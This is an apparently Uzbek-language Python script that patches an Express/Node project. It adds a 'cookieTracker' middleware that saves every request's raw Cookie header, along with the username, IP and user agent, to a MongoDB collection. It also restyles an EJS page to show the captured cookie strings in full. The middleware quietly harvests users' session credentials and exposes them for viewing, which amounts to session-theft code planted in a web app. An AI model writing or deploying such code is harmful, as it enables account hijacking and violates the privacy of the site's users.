import os
import re

print("⏳ Tizim bo'ylab fayllar qidirilmoqda...")

# 1. Express faylini (app.js / server.js / index.js) qidirish va yangilash
js_path = None
for root, dirs, files in os.walk('.'):
    if 'node_modules' in dirs: dirs.remove('node_modules')
    for file in files:
        if file in ['app.js', 'server.js', 'index.js']:
            p = os.path.join(root, file)
            try:
                if 'express()' in open(p, encoding='utf-8', errors='ignore').read():
                    js_path = p
                    break
            except: pass
    if js_path: break

if js_path:
    with open(js_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    if 'cookieTracker' not in content:
        # Middleware papkasini va faylini aynan app.js joylashgan joyda yaratamiz
        mw_dir = os.path.join(os.path.dirname(js_path), 'middlewares')
        os.makedirs(mw_dir, exist_ok=True)
        mw_file = os.path.join(mw_dir, 'cookieTracker.js')
        
        with open(mw_file, 'w', encoding='utf-8') as f:
            f.write("""const mongoose = require('mongoose');
const LiveCookie = mongoose.models.LiveCookie || mongoose.model('LiveCookie', new mongoose.Schema({
    foydalanuvchi: String, team: String, cookie: String, ip: String, qurilma: String, vaqt: { type: Date, default: Date.now }
}, { strict: false }));
module.exports = async (req, res, next) => {
    try {
        if (req.headers.cookie) {
            const username = req.user ? req.user.username : 'Anonim';
            const team = (req.user && req.user.team) ? req.user.team : '—';
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Noma`lum IP';
            const device = req.headers['user-agent'] || 'Noma`lum qurilma';
            await LiveCookie.findOneAndUpdate({ ip: ip, qurilma: device }, { foydalanuvchi: username, team: team, cookie: req.headers.cookie, qurilma: device, vaqt: new Date() }, { upsert: true, new: true });
        }
    } catch (err) {}
    next();
};
""")
        
        # app.js ichiga ulash
        new_content = re.sub(
            r'(const\s+\w+\s*=\s*express\(\);)', 
            r'\1\nconst cookieTracker = require("./middlewares/cookieTracker");\napp.use(cookieTracker);', 
            content, count=1, flags=re.IGNORECASE
        )
        with open(js_path, 'w', encoding='utf-8') as f:
            f.write(new_content)
        print(f"✅ {js_path} topildi va yangilandi!")
    else:
        print(f"✅ {js_path} allaqachon yangilangan ekan.")
else:
    print("❌ Express asosiy fayli topilmadi.")

# 2. EJS faylini qidirish va CSS stillarini qo'shish
ejs_path = None
for root, dirs, files in os.walk('.'):
    if 'node_modules' in dirs: dirs.remove('node_modules')
    for file in files:
        if file.endswith('.ejs'):
            p = os.path.join(root, file)
            try:
                if 'cookie.cookie' in open(p, encoding='utf-8', errors='ignore').read():
                    ejs_path = p
                    break
            except: pass
    if ejs_path: break

if ejs_path:
    with open(ejs_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Matnni siqmasdan to'liq ko'rsatuvchi stil qo'shish
    content = re.sub(
        r'<td>\s*<%=\s*cookie\.cookie\s*%>\s*</td>',
        '<td style="max-width: 400px; word-break: break-all; white-space: normal;">\n        <%= cookie.cookie %>\n    </td>',
        content
    )
    content = re.sub(
        r'<td>\s*<%=\s*cookie\.qurilma\s*%>\s*</td>',
        '<td style="max-width: 250px; word-break: break-word; font-size: 0.85em;">\n        <%= cookie.qurilma %>\n    </td>',
        content
    )
    
    with open(ejs_path, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f"✅ EJS fayli ({ejs_path}) dizayni muvaffaqiyatli yangilandi!")
else:
    print("❌ Cookie ko'rsatiladigan EJS fayli topilmadi.")

print("🎉 Tayyor! Endi Git orqali push qilib, Render.com da yangilang.")
